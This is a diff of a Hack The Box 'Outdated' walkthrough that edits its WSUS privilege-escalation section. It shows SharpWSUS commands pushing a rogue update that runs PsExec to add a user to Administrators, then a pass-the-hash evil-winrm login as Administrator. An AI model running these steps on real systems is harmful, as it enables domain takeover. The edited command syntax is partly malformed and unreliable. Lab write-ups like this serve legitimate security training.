@@ -340,7 +340,8 @@ CertUtil: -URLCache command completed successfully.
 ```
 
 
-*Evil-WinRM* PS C:\temp> ./sharpwsus.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators sflowers /add\"" /title:"rogue"
+```console
+*Evil-WinRM* PS C:\temp> cmd.exe 'sharpwsus.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators sflowers /add\"" /title:"rogue"'
 
  ____  _                   __        ______  _   _ ____
 / ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
@@ -384,9 +385,9 @@ DeploymentRevision
 [*] Create complete
 
 *Evil-WinRM* PS C:\temp> 
-
-
-*Evil-WinRM* PS C:\temp> ./sharpwsus.exe approve /updateid:24fc10f6-d8da-4231-a7c5-4c9e651318ad /computername:dc.outdated.htb /groupname:"rogue1"
+```
+```console
+*Evil-WinRM* PS C:\temp> cmd.exe \c 'sharpwsus.exe approve /updateid:24fc10f6-d8da-4231-a7c5-4c9e651318ad /computername:dc.outdated.htb /groupname:"rogue1"'
 
  ____  _                   __        ______  _   _ ____
 / ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
@@ -412,7 +413,7 @@ Approved Update
 *Evil-WinRM* PS C:\temp> 
 
 
-*Evil-WinRM* PS C:\temp> ./sharpwsus.exe check /updateid:24fc10f6-d8da-4231-a7c5-4c9e651318ad /computername:dc.outdated.htb
+*Evil-WinRM* PS C:\temp> cmd.exe \c 'sharpwsus.exe check /updateid:24fc10f6-d8da-4231-a7c5-4c9e651318ad /computername:dc.outdated.htb'
 
  ____  _                   __        ______  _   _ ____
 / ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
@@ -434,103 +435,37 @@ dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
 [*] Check complete
 
 *Evil-WinRM* PS C:\temp> 
-
-
-```
-*Evil-WinRM* PS C:\temp> ./sharp.exe create /payload:"C:\temp\PsExec64.exe" /args:"-accepteula -s
- -d cmd.exe /c \"net localgroup administrators sflowers /add\"" /title:"rogue"
-
- ____  _                   __        ______  _   _ ____
-/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
-\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
- ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
-|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
-                       |_|
-           Phil Keeble @ Nettitude Red Team
-
-[*] Action: Create Update
-[*] Creating patch to use the following:
-[*] Payload: PsExec64.exe
-[*] Payload Path: C:\temp\PsExec64.exe
-[*] Arguments: -accepteula -s -d cmd.exe /c \net
-[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c \net
-
-################# WSUS Server Enumeration via SQL ##################
-ServerName, WSUSPortNumber, WSUSContentLocation
------------------------------------------------
-DC, 8530, c:\WSUS\WsusContent
-
-ImportUpdate
-Update Revision ID: 30
-PrepareXMLtoClient
-InjectURL2Download
-DeploymentRevision
-PrepareBundle
-PrepareBundle Revision ID: 31
-PrepareXMLBundletoClient
-DeploymentRevision
-
-[*] Update created - When ready to deploy use the following command:
-[*] SharpWSUS.exe approve /updateid:04f25b66-446a-4a4e-bec0-ea03876a2d82 /computername:Target.FQDN /groupname:"Group Name"
-
-[*] To check on the update status use the following command:
-[*] SharpWSUS.exe check /updateid:04f25b66-446a-4a4e-bec0-ea03876a2d82 /computername:Target.FQDN
-
-[*] To delete the update use the following command:
-[*] SharpWSUS.exe delete /updateid:04f25b66-446a-4a4e-bec0-ea03876a2d82 /computername:Target.FQDN /groupname:"Group Name"
-
-[*] Create complete
-```
-```
-*Evil-WinRM* PS C:\temp> ./SharpWSUS.exe approve /updateid:c793cbdf-526a-4381-8b50-1aab62c92363 /computername:dc.outdated.htb /groupname:"rogue1"
-
- ____  _                   __        ______  _   _ ____
-/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
-\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
- ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
-|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
-                       |_|
-           Phil Keeble @ Nettitude Red Team
-
-[*] Action: Approve Update
-
-Targeting dc.outdated.htb
-TargetComputer, ComputerID, TargetID
-------------------------------------
-dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
-Group Exists = False
-Group Created: rogue1
-Added Computer To Group
-Approved Update
-
-[*] Approve complete
-
-*Evil-WinRM* PS C:\temp>
 ```
 
-```
-*Evil-WinRM* PS C:\temp> ./SharpWSUS.exe check /updateid:c793cbdf-526a-4381-8b50-1aab62c92363 /computername:dc.outdated.htb
 
- ____  _                   __        ______  _   _ ____
-/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
-\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
- ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
-|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
-                       |_|
-           Phil Keeble @ Nettitude Red Team
+```console
+*Evil-WinRM* PS C:\temp> net user sflowers
+User name                    sflowers
+Full Name                    Susan Flowers
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
 
-[*] Action: Check Update
+Password last set            6/20/2022 11:04:09 AM
+Password expires             Never
+Password changeable          6/21/2022 11:04:09 AM
+Password required            Yes
+User may change password     Yes
 
-Targeting dc.outdated.htb
-TargetComputer, ComputerID, TargetID
-------------------------------------
-dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   9/17/2022 7:15:14 PM
 
-[*] Update is installed
+Logon hours allowed          All
 
-[*] Check complete
-
-*Evil-WinRM* PS C:\temp> 
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *WSUS Administrators
+Global Group memberships     *Domain Users
+The command completed successfully.
 ```
 
 └──╼ [★]$ evil-winrm -i 10.129.56.140 -u Administrator -H 716f1ce2e2cf38ee1210cce35eb78cb6
